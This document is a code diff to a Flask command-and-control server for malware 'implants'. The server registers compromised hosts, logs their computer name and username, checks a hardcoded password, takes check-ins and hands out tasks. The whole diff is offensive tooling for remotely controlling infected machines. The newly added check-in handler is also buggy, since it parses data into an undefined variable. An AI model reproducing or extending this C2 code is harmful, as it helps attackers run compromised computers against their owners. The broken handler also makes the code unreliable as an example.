@@ -2,13 +2,13 @@
 
 from flask import Blueprint, request , abort 
 
-from implant_pb2 import * 
+from cvnt.implant_pb2 import * 
 
 from flask_wtf.csrf import *
 
-from db_operations import *
+from cvnt.db_operations import *
 
-from constants import *
+from cvnt.constants import *
 
 rpc = Blueprint("rpc", __name__)
 
@@ -16,27 +16,35 @@ PASSWORD = "SUPER_COMPLEX_PASSWORD_WOWZA!!!"
 
 @rpc.route("/register", methods=["POST"])
 def handle_register():
+    ip = request.remote_addr
     reg_data = request.get_data()
-    
     register = RegisterImplant()
     register.ParseFromString(reg_data)
-    print(f'[+] New Implant:')
-    print(f'[+]    * GUID: {register.GUID}')
-    print(f'[+]    * Hostname: {register.Hostname}')
+    print(f'[+] New Implant: from {request.remote_addr}')
+    print(f'[+]    * ImplantID: {register.ImplantID}')
+    print(f'[+]    * ComputerName: {register.ComputerName}')
     print(f'[+]    * Username: {register.Username}')
     print(f'[+]    * Password: {register.Password}')
     
     if register.Password != PASSWORD:
         abort(404)
 
-    print(f'[+] Password is bueno.')
+    r = register_implant(make_implant(register, ip))
 
-    r = register_implant(make_implant(register))
-
-    # TODO If implant with same GUID has already been added, don't add and send failure back.
-    # TODO If implant dies / kills itself, once last checkin expires, have Server remove said task from database
     print("[+] Watch out sexy ;) a New Implant connected!")
-    return REGISTRATION_SUCCESSFUL
+    return SUCCESSFUL
+
+@rpc.route("/checkin", methods=["POST"])
+def checkin():
+    reg_data = request.get_data()
+    checkin = ImplantCheckin()
+    register.ParseFromString(reg_data)
+    print(f'[+] Implant [{checkin.ImplantID}] checking in.')
+    print(f'[+] --> Response = [{checkin.Resp}]')
+
+    implant_checking_in(checkin)
+
+    return SUCCESSFUL 
 
 @rpc.route("/task/request", methods=["POST"])
 def send_task():
@@ -86,5 +94,3 @@ def receive_task_response():
     except Exception as e:
         print(f"Error receiving task response: {e}")
         return str(e), 500
-
-
